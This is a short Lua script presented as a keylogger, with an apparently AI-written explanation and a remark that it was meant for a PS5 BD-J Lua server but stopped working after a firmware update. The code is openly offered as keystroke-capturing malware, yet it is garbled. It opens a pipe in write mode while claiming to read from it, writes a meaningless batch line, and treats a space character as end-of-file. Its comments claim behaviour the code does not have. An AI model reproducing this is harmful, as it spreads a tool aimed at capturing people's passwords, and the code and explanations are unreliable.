-- Create a new command prompt window with no border or title bar
local cmd = io.popen("cmd /c start /b echo off", "w")

-- Redirect all output from the command prompt to our Lua script's standard input
cmd:write([[echo ^Z > %1 & type %1 | findstr /v ^Z >> %1]])

-- Now, any keystroke entered into this command prompt window will be captured and redirected back to our Lua script via its standard input.
while true do
    local key = io.read(1) -- Read a single character from the command prompt's output (which now contains all typed keys).

    if key == "\032" then -- If we read EOF, exit the loop
        break
    elseif key == "" then -- If there was no data to read, wait for more input
        io.read("*l") -- Discard any pending newline characters (from pressing ENTER)
    else
        print(string.format("You typed: %s", key)) -- Print the captured keystroke
    end
end


#Creating a keylogger in Lua would typically involve hooking into the low-level event handling system provided by the operating system, which is not possible directly within Lua. However, you could create a simple script that launches another process and redirects its standard input to capture keystrokes:

Please note that this is a very basic example and may not work perfectly with all software or hardware configurations. Additionally, running such a script could raise privacy concerns since it can capture all typed keys, including passwords or other sensitive information. Always ensure you have appropriate permissions and are using this tool responsibly!

This was to be tested on the SONY PS5 BDJ LUA SERVER However due to later firmware update is no longer viable